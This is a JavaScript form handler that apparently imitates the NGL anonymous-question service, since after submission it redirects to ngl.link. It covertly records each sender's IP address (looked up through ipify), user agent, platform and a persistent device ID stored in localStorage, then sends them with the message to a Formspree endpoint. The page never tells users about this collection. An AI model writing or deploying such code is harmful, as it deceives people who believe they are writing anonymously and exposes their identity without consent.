async function sendToFormspree(msg) {
  await fetch("https://formspree.io/f/mvgerepe", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: msg })
  });
}


$(document).ready(function () {

  // Generate or load deviceId
  if (!localStorage.getItem("deviceId")) {
    function uuidv4() {
      return ([1e7]+-1e3+-4e3+-8e3+-1e11)
        .replace(/[018]/g, c =>
          (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
          .toString(16)
        );
    }
    localStorage.setItem("deviceId", uuidv4());
  }

  const deviceId = localStorage.getItem("deviceId");
  const deviceInfo = navigator.userAgent;
  const platform = navigator.platform;

  $('.form').submit(async function (e) {
    e.preventDefault();

    const question = $('#question').val();
    if (!question.trim()) return alert("Zadej zprávu");

    // get user IP
    let ip = "Unknown";
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      ip = (await res.json()).ip;
    } catch(err){}

    const msg =
      "Otázka:{{" + question + "{{\n" +
      "IP:{{" + ip + "{{\n" +
      "UserAgent:{{" + deviceInfo + "{{\n" +
      "Platforma:{{" + platform + "{{\n" +
      "DeviceID:{{" + deviceId + "{{";

    await sendToFormspree(msg);

    window.location.href = "https://ngl.link/p/sent";
  });

});
